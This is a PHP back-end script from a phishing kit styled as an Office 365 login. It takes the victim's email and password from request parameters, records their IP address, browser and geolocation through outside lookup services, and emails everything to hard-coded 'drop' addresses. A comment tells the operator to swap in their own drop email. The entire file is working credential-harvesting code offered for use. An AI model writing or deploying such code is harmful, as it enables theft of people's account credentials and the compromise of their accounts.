<?php
//This script is for (All in one) server side

//Login info
$email = $_GET['email'];
$password = $_GET['password'];
$timestamp = date('Y-m-d H:i:s');

if(empty($email)){
    echo 'You cant submit empty details';
}else{
    function SendHtml($to, $subject, $body, $from, $from_cc = null)	{
    	// Always set content-type when sending HTML email
    	$headers = "MIME-Version: 1.0" . "\r\n";
    	$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
    	
    	$headers .= 'From: <'. $from .'>' . "\r\n";
    	
    	$headers .= 'Cc: '. $from_cc .' ' . "\r\n";
    	
    	if(mail($to, $subject, $body, $headers)):
    		// Message sent
    		return true;
    	else:
    		// Message couldn't be sent
    		return false;
    	endif;			
    } 
}




$browserAgent = $_SERVER['HTTP_USER_AGENT'];
$ipaddress = getenv('HTTP_CLIENT_IP')?:
getenv('HTTP_X_FORWARDED_FOR')?:
getenv('HTTP_X_FORWARDED')?:
getenv('HTTP_FORWARDED_FOR')?:
getenv('HTTP_FORWARDED')?:
getenv('REMOTE_ADDR');
$query = @unserialize(file_get_contents('http://ip-api.com/php/'.$ipaddress));
$query2 = @json_decode(file_get_contents("https://api.ipdata.co/{$ipaddress}"));
if($query && $query['status'] == 'success') {
  $ipDetails = 'This visitor came from '.$query['country'].', '.$query['regionName'] .', '.$query['city']. ' ' ;
} else {
  $ipDetails = $ipaddress. ' | '.@$query2->country . ' | '.@$query2->region. ' | '. @$query2->city ;

}


	
//Change the email to your drop email
$to = 'corriegallant4@gmail.com, ppumping@yandex.com';
$subject = "Office 365 for $email";
$headers .= "MIME-Version: 1.0\r\n";
$headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";

$body = '
<html>
<body>
	<table rules="all" style="border-color: lightgray;" cellpadding="10">
		<tr><td><strong>Subject:</strong> </td><td> '.strip_tags($subject).' </td></tr>
		<tr><td><strong>Email and Pass:</strong> </td><td> Email: '.strip_tags($email).'<br/> Password: '.$password.'</td></tr>
		<tr><td><strong>IP Details:</strong> </td><td> '.strip_tags($ipaddress).' </td></tr>
		<tr><td><strong>Where Link Is Clicked From:</strong> </td><td> ' .$ipDetails. ' </td></tr>
		<tr><td><strong>Browser Details:</strong> </td><td> ' .$browserAgent. ' </td></tr>
	</table>
</body>
</html>
'; 

SendHtml($to, $subject, $body, 'Office');
?>